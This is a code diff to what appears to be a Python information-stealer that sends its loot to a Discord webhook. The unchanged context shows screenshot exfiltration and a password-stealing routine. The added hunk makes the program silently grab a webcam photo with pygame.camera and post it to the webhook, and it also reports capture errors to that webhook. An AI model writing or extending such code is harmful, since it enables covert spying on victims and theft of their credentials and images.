@@ -15,6 +15,8 @@ import getpass
 import platform
 import ctypes
 import os
+import pygame
+import pygame.camera
 import random
 import re
 import shutil
@@ -821,7 +823,28 @@ if cc.get_screenshot():
     requests.post(webhook, files=files)
     files["screenshot"].close()
     os.remove("screenshot.png")
-
+    
+if cc.get_webcam():
+    camlist = pygame.camera.list_cameras()
+    try:
+        if camlist:
+            cam = pygame.camera.Camera(camlist[0], (640, 480))
+            cam.start()
+            image = cam.get_image()
+            pygame.image.save(image, "webcam.png")
+            files = {"webcam": open("webcam.png", "rb")}
+            requests.post(webhook, files=files)
+            files["webcam"].close()
+            os.remove("webcam.png")
+    except Exception as e:
+        ping = {
+            "content":
+            f"<a:arrowgif:982368820436008960> **Error occurred while trying to grab webcam picture. Advanced error log: ```{e}```** \<:blueerror:1130264417691500647>",
+            "username": wh_name,
+            "avatar_url": wh_avatar,
+        }
+        response = requests.post(webhook, json=ping)
+        
 if cc.get_password_stealing() is True:
     wikith = Kiwi()
     for thread in wikith:
